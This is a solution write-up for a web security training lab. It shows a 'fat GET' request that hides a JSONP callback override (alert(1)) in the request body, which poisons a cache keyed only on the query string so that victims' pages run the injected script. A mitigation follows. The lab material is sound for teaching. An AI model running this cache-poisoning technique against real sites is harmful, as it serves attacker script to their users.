# Lab 12 — Web cache poisoning via a fat GET request

> **Expert** · [Official lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

**Entry point:** JSONP `/js/geolocate.js?callback=setCountryCookie` — the
app reads parameters from the **GET body** too, while the cache keys on the
query string only.

## Solution

1. Send a "fat GET" — duplicate the callback in the body:

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 27

callback=alert(1)
```

2. The response executes `alert(1)({"country": ...})` — but the
   `X-Cache-Key` still shows `?callback=setCountryCookie`, matching the
   import URL on every page.
3. Replay until cached, then let the victim's page import it — the poisoned
   JSONP runs in their browser — lab solved.

## Mitigation

Ignore GET bodies server-side; if you must, include the body in the cache
key.
